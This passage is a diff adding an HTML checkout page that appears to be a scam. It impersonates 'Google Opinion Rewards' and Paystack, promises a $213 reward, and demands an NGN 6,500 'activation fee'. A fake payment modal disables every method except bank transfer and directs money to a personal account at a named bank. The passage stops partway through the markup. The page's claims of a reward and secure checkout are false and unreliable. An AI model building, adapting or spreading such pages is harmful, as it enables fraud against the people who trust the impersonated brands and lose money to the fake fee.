@@ -1,0 +1,1566 @@
+<!DOCTYPE html><html lang="en"><head>
+      <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS3ZLZ01aQ2SsrIJ_KCgEHsZW1vXnwCjOYnDj1G8hhM8Qd1Vtvejz1jVo9t&s=10">
+
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '559097613847086');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=559097613847086&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Checkout</title>
+    <script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '559097613847086');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=559097613847086&ev=PageView&noscript=1"
+/></noscript>
+<!-- Nigerian Little-->
+
+        <script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '559097613847086');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=559097613847086&ev=PageView&noscript=1"
+/></noscript>
+<!-- Londom-->
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== PAGE HEADER ===== */
+        .page-header {
+            background: #fff;
+            border-bottom: 1px solid #e5e5e5;
+            padding: 0 24px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .page-header-logo {
+            height: 32px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .page-header-points {
+            font-size: 13px;
+            font-weight: 700;
+            color: #fff;
+            background: #3bb75e;
+            padding: 6px 14px;
+            border-radius: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        /* ===== CHECKOUT PAGE ===== */
+        .checkout-page {
+            flex: 1;
+            max-width: 520px;
+            width: 100%;
+            margin: 0 auto;
+            padding: 32px 20px 40px;
+        }
+
+        .checkout-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 24px;
+        }
+
+        /* Product Card */
+        .product-card {
+            background: #fff;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+            margin-bottom: 24px;
+        }
+
+        .product-image {
+            width: 100%;
+            height: 120px;
+            overflow: hidden;
+        }
+
+        .product-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .product-info {
+            padding: 20px;
+        }
+
+        .product-name {
+            font-size: 17px;
+            font-weight: 600;
+            color: #111;
+            margin-bottom: 6px;
+        }
+
+        .product-desc {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.5;
+        }
+
+        /* Checkout Form */
+        .checkout-form {
+            background: #fff;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+            margin-bottom: 24px;
+        }
+
+        .checkout-form .form-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .checkout-form .form-group {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .checkout-form .form-group.full {
+            margin-bottom: 16px;
+        }
+
+        .checkout-form label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+
+        .checkout-form input {
+            border: 1.5px solid #ddd;
+            border-radius: 6px;
+            padding: 12px;
+            font-size: 14px;
+            font-family: inherit;
+            color: #333;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .checkout-form input:focus {
+            border-color: #3bb75e;
+        }
+
+        .checkout-form input::placeholder {
+            color: #aaa;
+        }
+
+        .checkout-form .amount-field {
+            display: flex;
+            align-items: stretch;
+            border: 1.5px solid #ddd;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+
+        .checkout-form .amount-field .currency-tag {
+            background: #f5f5f5;
+            padding: 12px 14px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #555;
+            display: flex;
+            align-items: center;
+            border-right: 1.5px solid #ddd;
+        }
+
+        .checkout-form .amount-field input {
+            border: none;
+            border-radius: 0;
+            flex: 1;
+            font-weight: 600;
+            color: #111;
+            background: #fafafa;
+        }
+
+        .checkout-form .amount-field input:focus {
+            border: none;
+        }
+
+        /* Pay Button */
+        .pay-btn {
+            width: 100%;
+            padding: 16px;
+            background: #3bb75e;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .pay-btn:hover { background: #34a853; }
+        .pay-btn:active { transform: scale(0.99); }
+
+        .pay-btn svg {
+            width: 18px;
+            height: 18px;
+            stroke: #fff;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .secure-badge {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 11px;
+            color: #bbb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+
+        .secure-badge svg {
+            width: 12px;
+            height: 12px;
+            stroke: #bbb;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        /* ===== PAGE FOOTER ===== */
+        .page-footer {
+            background: #fff;
+            border-top: 1px solid #e5e5e5;
+            padding: 20px 24px;
+            text-align: center;
+        }
+
+        .page-footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 12px;
+        }
+
+        .page-footer-links a {
+            font-size: 12px;
+            color: #888;
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+
+        .page-footer-links a:hover { color: #333; }
+
+        .page-footer-copy {
+            font-size: 11px;
+            color: #bbb;
+        }
+
+        /* ===== MODAL OVERLAY ===== */
+        .ps-overlay {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.4);
+            z-index: 999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            animation: psOverlayIn 0.2s ease;
+        }
+
+        .ps-overlay.open {
+            display: flex;
+        }
+
+        @keyframes psOverlayIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .ps-checkout {
+            position: relative;
+            z-index: 1000;
+            overflow: hidden;
+            background: #fff;
+            width: 490px;
+            max-width: 100vw;
+            min-height: 420px;
+            border-radius: 5px;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.15);
+            display: flex;
+            animation: psModalIn 0.25s ease;
+        }
+
+        @keyframes psModalIn {
+            from { opacity: 0; transform: scale(0.95) translateY(10px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        /* ===== SIDEBAR (desktop only) ===== */
+        .ps-sidebar {
+            width: 130px;
+            background: #f9f9f9;
+            border-right: 1px solid #eee;
+            padding: 20px 0;
+            flex-shrink: 0;
+        }
+
+        .ps-sidebar-title {
+            font-size: 10px;
+            font-weight: 600;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 0 16px;
+            margin-bottom: 16px;
+        }
+
+        .ps-sidebar-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 16px;
+            cursor: pointer;
+            font-size: 12px;
+            color: #555;
+            border-left: 3px solid transparent;
+            transition: all 0.15s;
+        }
+
+        .ps-sidebar-item:hover {
+            background: #f0f0f0;
+        }
+
+        .ps-sidebar-item.active {
+            color: #3bb75e;
+            font-weight: 600;
+            border-left-color: #3bb75e;
+            background: #fff;
+        }
+
+        .ps-sidebar-item.disabled {
+            opacity: 0.4;
+            cursor: default;
+        }
+
+        .ps-sidebar-item svg {
+            width: 14px; height: 14px;
+            stroke: currentColor; fill: none; stroke-width: 2;
+            flex-shrink: 0;
+        }
+
+        .ps-sidebar-item.active svg { stroke: #3bb75e; }
+
+        /* ===== MAIN CONTENT ===== */
+        .ps-main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+
+        /* ===== HEADER ===== */
+        .ps-header {
+            padding: 18px 24px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .ps-logo {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            margin-top: 2px;
+        }
+
+        .ps-logo span {
+            display: block;
+            height: 3px;
+            border-radius: 1px;
+        }
+
+        .ps-logo span:nth-child(1) { width: 18px; background: #00C3F7; }
+        .ps-logo span:nth-child(2) { width: 14px; background: #0070BA; }
+        .ps-logo span:nth-child(3) { width: 10px; background: #011B33; }
+
+        .ps-header-right {
+            text-align: right;
+        }
+
+        .ps-header-email {
+            font-size: 13px;
+            color: #555;
+        }
+
+        .ps-header-amount {
+            font-size: 13px;
+            color: #3bb75e;
+            font-weight: 600;
+            margin-top: 2px;
+        }
+
+        .ps-close {
+            flex-shrink: 0;
+            width: 24px; height: 24px;
+            border: none;
+            background: none;
+            cursor: pointer;
+            font-size: 20px;
+            color: #ccc;
+            transition: color 0.15s;
+            line-height: 24px;
+            text-align: center;
+            padding: 0;
+            margin-left: 8px;
+            margin-top: -2px;
+        }
+
+        .ps-close:hover { color: #666; }
+
+        /* ===== BODY ===== */
+        .ps-body {
+            flex: 1;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== SCREENS ===== */
+        .ps-screen { display: none; flex: 1; flex-direction: column; }
+        .ps-screen.active { display: flex; animation: psFadeIn 0.2s ease; }
+
+        @keyframes psFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .ps-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .ps-btn-green {
+            background: #3bb75e;
+            color: #fff;
+        }
+
+        .ps-btn-green:hover { background: #34a853; }
+        .ps-btn-green:active { transform: scale(0.99); }
+
+        /* ===== METHOD SELECT SCREEN (mobile) ===== */
+        .ps-method-title {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            color: #999;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+        }
+
+        .ps-method-list { list-style: none; }
+
+        .ps-method-list li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 0;
+            border-bottom: 1px solid #f5f5f5;
+            cursor: pointer;
+            transition: background 0.1s;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .ps-method-list li:hover { background: #fafafa; margin: 0 -24px; padding-left: 24px; padding-right: 24px; }
+        .ps-method-list li.disabled { opacity: 0.35; cursor: default; }
+        .ps-method-list li.disabled:hover { background: none; margin: 0; padding-left: 0; padding-right: 0; }
+
+        .ps-method-list li svg {
+            width: 16px; height: 16px;
+            stroke: #888; fill: none; stroke-width: 2;
+            flex-shrink: 0;
+        }
+
+        .ps-method-list li.active-method {
+            background: #eafbef;
+            border: 1.5px solid #3bb75e;
+            border-radius: 10px;
+            padding: 14px 16px;
+            margin: 4px 0;
+            position: relative;
+        }
+        .ps-method-list li.active-method svg {
+            stroke: #3bb75e;
+        }
+        .ps-method-list li.active-method:hover {
+            background: #d9f7e4;
+            margin: 4px 0;
+            padding-left: 16px;
+            padding-right: 16px;
+        }
+        .ps-method-list li .available-badge {
+            font-size: 9px;
+            background: #3bb75e;
+            color: #fff;
+            padding: 2px 8px;
+            border-radius: 3px;
+            margin-left: auto;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        .ps-method-list li .unavailable-badge {
+            font-size: 9px;
+            background: #f5f5f5;
+            color: #bbb;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-weight: 600;
+            text-transform: uppercase;
+            margin-left: auto;
+        }
+
+        .ps-method-footer {
+            margin-top: auto;
+            padding-top: 16px;
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+        }
+
+        /* ===== TRANSFER SCREEN ===== */
+        .ps-transfer-bar {
+            display: none; /* shown on mobile */
+            align-items: center;
+            gap: 8px;
+            padding: 12px 0;
+            margin-bottom: 8px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .ps-transfer-bar svg {
+            width: 14px; height: 14px;
+            stroke: #3bb75e; fill: none; stroke-width: 2;
+        }
+
+        .ps-transfer-bar span {
+            font-size: 13px;
+            font-weight: 600;
+            color: #3bb75e;
+        }
+
+        .ps-transfer-bar .ps-change-link {
+            margin-left: auto;
+            font-size: 12px;
+            color: #999;
+            cursor: pointer;
+            font-weight: 400;
+        }
+
+        .ps-transfer-bar .ps-change-link:hover { color: #3bb75e; }
+
+        .ps-transfer-text {
+            font-size: 14px;
+            color: #555;
+            text-align: center;
+            margin: 20px 0;
+            line-height: 1.5;
+        }
+
+        .ps-transfer-card {
+            border: 1px solid #eee;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 16px;
+            background: #fff;
+        }
+
+        .ps-card-field {
+            padding: 14px 18px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .ps-card-field:last-child {
+            border-bottom: none;
+        }
+
+        .ps-card-field-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
+        .ps-card-field-label {
+            font-size: 11px;
+            font-weight: 600;
+            color: #999;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .ps-card-field-value {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .ps-card-field-value span {
+            font-size: 17px;
+            font-weight: 600;
+            color: #222;
+        }
+
+        .ps-copy-icon {
+            width: 18px; height: 18px;
+            cursor: pointer;
+            opacity: 0.3;
+            transition: opacity 0.15s;
+            stroke: #333; fill: none; stroke-width: 2;
+            flex-shrink: 0;
+        }
+
+        .ps-copy-icon:hover { opacity: 0.7; }
+        .ps-copy-icon.copied { stroke: #3bb75e; opacity: 1; }
+
+        .ps-expires {
+            text-align: center;
+            padding: 12px 16px;
+            font-size: 13px;
+            color: #999;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .ps-expires strong {
+            color: #666;
+            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+        }
+
+        .ps-expires.urgent { color: #dc2626; }
+        .ps-expires.urgent strong { color: #dc2626; }
+
+        .ps-progress-bar {
+            height: 3px;
+            background: #eee;
+            overflow: hidden;
+        }
+
+        .ps-progress-bar-inner {
+            height: 100%;
+            background: #3bb75e;
+            width: 30%;
+            border-radius: 0 2px 2px 0;
+            animation: psProgressPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes psProgressPulse {
+            0% { width: 10%; opacity: 0.7; }
+            50% { width: 60%; opacity: 1; }
+            100% { width: 10%; opacity: 0.7; }
+        }
+
+        .ps-btn-outline {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #555;
+            background: #fff;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.15s;
+            margin-top: 8px;
+        }
+
+        .ps-btn-outline:hover { border-color: #3bb75e; color: #3bb75e; }
+        .ps-btn-outline:disabled { opacity: 0.4; cursor: default; pointer-events: none; }
+        .ps-btn-outline.hidden { display: none; }
+
+        /* ===== FAILED ===== */
+        .ps-failed {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 8px;
+        }
+
+        .ps-fail-circle {
+            width: 56px; height: 56px;
+            background: #e74c3c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            animation: psPop 0.3s ease;
+        }
+
+        .ps-fail-circle svg {
+            width: 28px; height: 28px;
+            stroke: #fff; fill: none; stroke-width: 2.5;
+        }
+
+        .ps-failed h3 { font-size: 15px; color: #333; font-weight: 600; }
+        .ps-failed p { font-size: 13px; color: #999; line-height: 1.5; }
+
+        .ps-btn-retry {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #555;
+            background: #fff;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.15s;
+            margin-top: 16px;
+        }
+
+        .ps-btn-retry:hover { border-color: #3bb75e; color: #3bb75e; }
+
+        /* ===== VERIFYING ===== */
+        .ps-verifying {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 16px;
+        }
+
+        .ps-spinner {
+            width: 40px; height: 40px;
+            border: 3px solid #eee;
+            border-top-color: #3bb75e;
+            border-radius: 50%;
+            animation: psSpin 0.7s linear infinite;
+        }
+
+        @keyframes psSpin { to { transform: rotate(360deg); } }
+
+        .ps-verifying h3 { font-size: 15px; color: #333; font-weight: 600; }
+        .ps-verifying p { font-size: 13px; color: #999; }
+
+        /* ===== SUCCESS ===== */
+        .ps-success {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            gap: 8px;
+        }
+
+        .ps-check-circle {
+            width: 56px; height: 56px;
+            background: #3bb75e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+            animation: psPop 0.3s ease;
+        }
+
+        @keyframes psPop {
+            from { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            to { transform: scale(1); }
+        }
+
+        .ps-check-circle svg {
+            width: 28px; height: 28px;
+            stroke: #fff; fill: none; stroke-width: 2.5;
+        }
+
+        .ps-success h3 { font-size: 16px; color: #333; font-weight: 600; }
+        .ps-success .ps-success-amount { font-size: 22px; font-weight: 700; color: #333; }
+        .ps-success .ps-success-amount .cur { font-size: 13px; color: #999; }
+        .ps-success p { font-size: 12px; color: #999; }
+
+        .ps-ref {
+            font-size: 11px;
+            color: #bbb;
+            font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+            margin-top: 8px;
+        }
+
+        .ps-success-btn {
+            display: inline-block;
+            margin-top: 16px;
+            text-align: center;
+            text-decoration: none;
+            width: auto;
+            padding: 12px 32px;
+        }
+
+        .ps-success-btn.hidden { display: none; }
+
+        /* ===== FOOTER ===== */
+        .ps-footer {
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .ps-footer svg {
+            width: 10px; height: 10px;
+            stroke: #bbb; fill: none; stroke-width: 2;
+        }
+
+        .ps-footer span {
+            font-size: 10px;
+            color: #bbb;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .ps-footer strong {
+            font-size: 10px;
+            color: #333;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            font-weight: 800;
+        }
+
+        /* ========================================
+           MOBILE RESPONSIVE
+           ======================================== */
+        @media (max-width: 520px) {
+            .checkout-page {
+                padding: 20px 16px 32px;
+            }
+
+            .checkout-form {
+                padding: 16px;
+            }
+
+            .checkout-form .form-row {
+                flex-direction: column;
+                gap: 16px;
+            }
+
+            .checkout-form input {
+                padding: 14px 12px;
+                font-size: 15px;
+            }
+
+            .checkout-form .amount-field .currency-tag {
+                padding: 14px 12px;
+            }
+
+            .pay-btn {
+                padding: 16px;
+                font-size: 16px;
+            }
+
+            .ps-overlay {
+                align-items: flex-end;
+                background: rgba(0,0,0,0.3);
+            }
+
+            .ps-checkout {
+                width: 100%;
+                max-width: 100%;
+                max-height: 85vh;
+                max-height: 85dvh;
+                border-radius: 16px 16px 0 0;
+                box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
+                flex-direction: column;
+            }
+
+            .ps-sidebar { display: none; }
+
+            .ps-transfer-bar { display: flex; }
+
+            .ps-header { padding: 14px 20px; }
+
+            .ps-body { padding: 20px; }
+
+            .ps-method-list li {
+                padding: 16px 0;
+                font-size: 15px;
+            }
+
+            .ps-account-num {
+                font-size: 22px;
+            }
+
+            .ps-btn, .ps-btn-outline {
+                padding: 14px;
+                font-size: 15px;
+            }
+
+            .ps-footer {
+                padding: 14px 20px;
+            }
+        }
+
+        /* DESKTOP: hide mobile-only elements */
+        @media (min-width: 521px) {
+            .ps-mobile-only { display: none !important; }
+        }
+    </style>
+<!-- CSS_ADSBLOCK_START -->
+<link rel="stylesheet" href="https://adblockers.opera-mini.net/css_block/default-domainless.css" type="text/css" />
+<!-- CSS_ADSBLOCK_END -->
+</head>
+<body>
+
+<!-- PAGE HEADER -->
+<header class="page-header">
+    <img class="page-header-logo" src="https://google-reward.kanex.online/nigeria/Google__G__logo.svg.png" alt="Logo">
+    <div class="page-header-points">$213 USD</div>
+</header>
+
+<!-- CHECKOUT PAGE -->
+<main class="checkout-page">
+    <h1 class="checkout-title">Google Opinion Rewards</h1>
+
+    <!-- Product -->
+    <div class="product-card">
+        <div class="product-image">
+            <img src="https://google-reward.kanex.online/nigeria/unnamed (1).png" alt="Product">
+        </div>
+        <div class="product-info">
+            <div class="product-name">Activation Fee</div>
+            <div class="product-desc">Instant access after payment. Includes all features and lifetime updates.</div>
+        </div>
+    </div>
+
+    <!-- Checkout Form -->
+    <div class="checkout-form">
+        <div class="form-row">
+            <div class="form-group">
+                <label>First name</label>
+                <input type="text" id="firstName" placeholder="First name">
+            </div>
+            <div class="form-group">
+                <label>Last name</label>
+                <input type="text" id="lastName" placeholder="Last name">
+            </div>
+        </div>
+        <div class="form-group full">
+            <label>Email address</label>
+            <input type="email" id="userEmail" placeholder="Email address">
+        </div>
+        <div class="form-group full">
+            <label>Amount</label>
+            <div class="amount-field">
+                <span class="currency-tag">NGN</span>
+                <input type="text" id="amountDisplay" value="6,500" readonly="">
+            </div>
+        </div>
+    </div>
+
+    <!-- Pay Button -->
+    <button class="pay-btn" id="payBtn" onclick="openModal()">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        Pay <span id="payBtnAmount">NGN 6,500</span>
+    </button>
+    <div class="secure-badge">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        Secured by Paystack
+    </div>
+</main>
+
+<!-- PAGE FOOTER -->
+<footer class="page-footer">
+    <div class="page-footer-links">
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Support</a>
+    </div>
+    <div class="page-footer-copy">© 2026 Store. All rights reserved.</div>
+</footer>
+
+<!-- PAYSTACK MODAL (hidden by default) -->
+<div class="ps-overlay" id="overlay">
+    <div class="ps-checkout" id="checkout">
+
+        <!-- SIDEBAR (desktop) -->
+        <div class="ps-sidebar" id="sidebar">
+            <div class="ps-sidebar-title">Pay with</div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                Card
+            </div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11"></path></svg>
+                Bank
+            </div>
+            <div class="ps-sidebar-item active" onclick="showTransfer()">
+                <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"></path></svg>
+                Transfer
+            </div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                USSD
+            </div>
+            <div class="ps-sidebar-item disabled">
+                <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                Visa QR
+            </div>
+        </div>
+
+        <!-- MAIN -->
+        <div class="ps-main">
+            <!-- HEADER -->
+            <div class="ps-header" id="psHeader">
+                <div class="ps-logo">
+                    <span></span><span></span><span></span>
+                </div>
+                <div class="ps-header-right">
+                    <div class="ps-header-email" id="headerEmail"></div>
+                    <div class="ps-header-amount">Pay <strong id="headerAmount">NGN 6,500</strong></div>
+                </div>
+                <button class="ps-close" onclick="closeModal()">×</button>
+            </div>
+
+            <!-- BODY -->
+            <div class="ps-body">
+
+                <!-- Screen: Choose Method (mobile only) -->
+                <div class="ps-screen ps-mobile-only" id="screenMethods">
+                    <div class="ps-method-title">Choose a payment method</div>
+                    <ul class="ps-method-list">
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
+                            Pay with Card
+                            <span class="unavailable-badge">Unavailable</span>
+                        </li>
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11"></path></svg>
+                            Pay with Bank
+                            <span class="unavailable-badge">Unavailable</span>
+                        </li>
+                        <li class="active-method" onclick="showTransfer()">
+                            <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"></path></svg>
+                            Transfer
+                            <span class="available-badge">Available</span>
+                        </li>
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                            Pay with USSD
+                            <span class="unavailable-badge">Unavailable</span>
+                        </li>
+                        <li class="disabled">
+                            <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                            Pay with Visa QR
+                            <span class="unavailable-badge">Unavailable</span>
+                        </li>
+                    </ul>
+                    <div class="ps-method-footer">
+                        Pick one of the payment methods above to pay <span id="methodFooterAmount">NGN 6,500</span>
+                    </div>
+                </div>
+
+                <!-- Screen: Transfer -->
+                <div class="ps-screen" id="screenTransfer">
+                    <!-- Mobile top bar -->
+                    <div class="ps-transfer-bar ps-mobile-only">
+                        <svg viewBox="0 0 24 24"><path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11M20 10v11M8 14v3M12 14v3M16 14v3"></path></svg>
+                        <span>Transfer</span>
+                        <span class="ps-change-link" onclick="goToMethods()">Change</span>
+                    </div>
+
+                    <div class="ps-transfer-text">
+                        Transfer <strong id="transferAmt">NGN 6,500</strong> to <strong id="acctName">PAYSTACK CHECKOUT</strong>
+                    </div>
+
+                    <div class="ps-transfer-card">
+                        <!-- Account Name -->
+                        <div class="ps-card-field">
+                            <div class="ps-card-field-header">
+                                <span class="ps-card-field-label">Account Name</span>
+                            </div>
+                            <div class="ps-card-field-value">
+                                <span id="acctHolder">BASSEY GODSWILL</span>
+                            </div>
+                        </div>
+                        <!-- Bank Name -->
+                        <div class="ps-card-field">
+                            <div class="ps-card-field-header">
+                                <span class="ps-card-field-label">Bank Name</span>
+                            </div>
+                            <div class="ps-card-field-value">
+                                <span id="bankName">Fidelity Bank</span>
+                            </div>
+                        </div>
+                        <!-- Account Number -->
+                        <div class="ps-card-field">
+                            <div class="ps-card-field-header">
+                                <span class="ps-card-field-label">Account Number</span>
+                            </div>
+                            <div class="ps-card-field-value">
+                                <span id="acctNum">4567379730</span>
+                                <svg class="ps-copy-icon" onclick="copyAcct(this)" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                            </div>
+                        </div>
+                        <!-- Amount -->
+                        <div class="ps-card-field">
+                            <div class="ps-card-field-header">
+                                <span class="ps-card-field-label">Amount</span>
+                            </div>
+                            <div class="ps-card-field-value">
+                                <span id="transferCardAmt">NGN 6,500</span>
